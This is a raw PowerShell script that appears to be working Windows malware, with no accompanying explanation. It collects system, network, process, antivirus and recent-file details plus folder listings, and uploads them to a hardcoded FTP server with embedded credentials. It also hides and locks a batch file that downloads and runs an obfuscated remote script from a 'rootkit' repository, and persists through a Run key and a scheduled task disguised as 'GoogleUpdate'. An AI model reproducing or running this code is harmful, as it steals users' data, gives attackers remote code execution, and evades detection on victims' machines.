$da = "{0:yyyyMMddHHmmss}" -f (Get-Date)
$filename = "$env:appdata\koala_$da"

$rc = Get-ChildItem ([Environment]::GetFolderPath('Recent'))
$ic = ipconfig /all
$gp=Get-process
$sy = systeminfo
$antivirusInfo = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntivirusProduct
$anvi = $antivirusInfo | Select-Object DisplayName, ProductState, PathToSignedProductExe

ac $filename $rc -Encoding 'utf8'
ac $filename $ic
ac $filename $gp
ac $filename $sy
ac $filename $anvi

$ftpuri = "ftp://4209703_qws:YXHHiOyi7Ozymj@qposg.getenjoyment.net/qposg.getenjoyment.net/"

$webclient = New-Object System.Net.WebClient
$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($filename))
$webclient.UploadFile($uri, $filename)
del $filename

$RegistryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$Name         = 'Version'
$paFile        = $env:appdata + '\koau.bat'

function Set_bootACL($filepath)
{
	if(!(Test-Path -Path $filepath))
	{
		Write-Host "File is not existed"
		return $False
	}	
	attrib +S +H +R $filepath
	$mgr_acl = Get-ACL -Path "C:\Windows\System32\intl.cpl"
	$user_sid = New-Object System.Security.Principal.Ntaccount('NT AUTHORITY\SYSTEM')
	$mgr_acl.SetOwner($user_sid)
	Set-Acl -Path $filepath -ACLObject $mgr_acl	
	return $True
}
$content = "cmd /c start /min powershell start-process powershell {[string]`$awdsdsadas={(Nxsderwtyuhvew-Obxsderwtyuhvject Nxsderwtyuhvet.WxsderwtyuhvebClxsderwtyuhvient).Dowxsderwtyuhvnloadsxsderwtyuhvtring('hxsderwtyuhvttpxsderwtyuhvs:/xsderwtyuhv/rxsderwtyuhvaw.gixsderwtyuhvthubuserconxsderwtyuhvtent.cxsderwtyuhvom/ghxsderwtyuhvproot/myrxsderwtyuhvootkit/maxsderwtyuhvin/koauxsderwtyuhv12.txsderwtyuhvxt')};`$dfsfsdf=`$awdsdsadas.Replace('xsderwtyuhv','');`$bvcbvcv=iex `$dfsfsdf;invoke-expression `$bvcbvcv} -windowstyle hidden"
sc $paFile $content
Set_bootACL($paFile)

schtasks /create /tn "GoogleUpdate" /tr $paFile /st 15:30
New-ItemProperty -Path $RegistryPath -Name $Name -Value $paFile -Force

$down = "$env:Appdata\down.txt"
$docu = "$env:Appdata\docu.txt"
$desk = "$env:Appdata\desk.txt"
dir "$env:userprofile\Downloads" -depth 10 >> $down
dir "$env:userprofile\Documents" -depth 10 >> $docu
dir "$env:userprofile\Desktop" -depth 10 >> $desk
$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($down))
$webclient.UploadFile($uri, $down)
$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($docu))
$webclient.UploadFile($uri, $docu)$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($desk))
$webclient.UploadFile($uri, $desk)

del $down
del $docu
del $desk
